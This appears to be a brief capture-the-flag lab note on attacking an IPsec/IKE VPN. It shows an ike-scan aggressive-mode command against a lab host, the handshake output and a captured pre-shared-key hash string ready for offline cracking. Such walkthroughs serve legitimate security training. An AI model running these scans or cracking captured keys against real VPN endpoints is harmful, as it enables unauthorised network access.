# IPSEC / IKE Attacks

REF: https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html#finding-a-valid-transformation

ike-scan -P -M -A -n fakeID 10.129.95.215

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.95.215   Aggressive Mode Handshake returned
        HDR=(CKY-R=62ce9a71e9e9cc96)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
b729e5ede2c60ba12fe6ea3e0a91657d90c0b77e35779ddff49e5cec6a11e3fa62dd2f3f9c22019310a97508ee4c20837add9d5aab8936dd983e07317b5be474aa107c39213a4e271dfc1406cb65be6a0b93b09fde911bfc10ac00b958215d0c9bee953fe4445d30f06ef9b1c082e3c81210cb183693df5b2c2daac829b15ba4:b7f2e268dabb99d7bb9a476c260a2dd66b35998244d873b27ba8fa3be48f8bd227f8b2c24400296c6d67c1fdc2dd051bbe6aa6059ba190f8144813eb86eab64398cf627b80a18d3c0b1372a293a092345bad334abbb00a9f6b58097ff938346bbc7db89855fbbfef6ffa38c27bdfca47139d94e5653635a6ee8236968463db79:62ce9a71e9e9cc96:a9b027738c2c244b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:3c9d5c287f2ca233dedf3ef612de1465a008ed65:afee7651ca9c74350b9fd762e18e92240ce3f6c9658ef98a9f39df90cfe2a1dc:2d582e1879b3026dd63722ff33806ca4fb2ed639
Ending ike-scan 1.9.6: 1 hosts scanned in 0.184 seconds (5.45 hosts/sec).  1 returned handshake; 0 returned notify
